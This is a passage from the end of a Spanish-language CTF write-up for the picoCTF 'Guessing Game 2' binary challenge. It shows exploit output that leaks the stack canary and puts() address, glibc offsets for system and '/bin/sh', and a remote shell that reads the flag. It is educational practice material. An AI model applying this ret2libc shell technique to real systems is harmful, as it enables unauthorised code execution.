</code></pre></div><p>Genial, es -3983 para la instancia remota. Ahora lanzamos el <em>exploit</em>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py jupiter.challenges.picoctf.org 15815
[<span class=code-green>+</span>] Guessed number: -3983
[<span class=code-green>+</span>] Opening connection to jupiter.challenges.picoctf.org on port 15815: Done  
[<span class=code-green>+</span>] Leaked canary: 0xf2d4c600
[<span class=code-green>+</span>] Leaked puts() address: 0xf7e10460
[<span class=code-green>+</span>] Glibc base address: 0xf7d9f1d0
[<span class=code-blue>*</span>] Switching to interactive mode
timeout: the monitored command dumped core
[<span class=code-blue>*</span>] Got EOF while reading in interactive
<span class=code-red>$</span>
</code></pre></div><p>Evidentemente, no va a funcionar porque la versión de Glibc no es la misma que tenemos en local. Sin embargo, podemos utilizar una <a href=https://libc.blukat.me>base de datos de Glibc</a> donde buscamos por los tres últimos dígitos de la dirección de <code>puts</code> (en este caso, <code>460</code>):</p><p><img src=/images/picoCTF/guessing-game-2-libc-wrong.png alt="Wrong Glibc version"></p><p>Vemos que el <em>offset</em> de <code>puts</code> es <code>0x071460</code>, el <em>offset</em> de <code>system</code> es <code>0x045350</code> y el <em>offset</em> de <code>"/bin/sh"</code> es <code>0x19032b</code>. Si actualizamos estos valores en el <em>exploit</em>, vemos que aún no conseguimos una consola interactiva. podemos probar más versiones de Glibc hasta encontrar la correcta:</p><p><img src=/images/picoCTF/guessing-game-2-libc-right.png alt="Right Glibc version"></p><ul><li><em>Offset</em> de <code>puts</code>: <code>0x067460</code></li><li><em>Offset</em> de <code>system</code>: <code>0x03ce10</code></li><li><em>Offset</em> de <code>"/bin/sh"</code>: <code>0x17b88f</code></li></ul><p>Y finalmente, el <em>exploit</em> funciona en remoto:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py jupiter.challenges.picoctf.org 15815
[<span class=code-green>+</span>] Guessed number: -3983
[<span class=code-green>+</span>] Opening connection to jupiter.challenges.picoctf.org on port 15815: Done  
[<span class=code-green>+</span>] Leaked canary: 0x70b20e00
[<span class=code-green>+</span>] Leaked puts() address: 0xf7dc9460
[<span class=code-green>+</span>] Glibc base address: 0xf7d62000
[<span class=code-blue>*</span>] Switching to interactive mode
<span class=code-red>$</span> ls
flag.txt
vuln
vuln.c
xinet_startup.sh
<span class=code-red>$</span> cat flag.txt
picoCTF{p0p_r0p_4nd_dr0p_1t_506b81e98597929e}
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div></article></main><footer class="bg-black bottom-0 w-100 pa3" role=contentinfo><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a><div style=margin-top:8px><div><div><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></footer></body></html>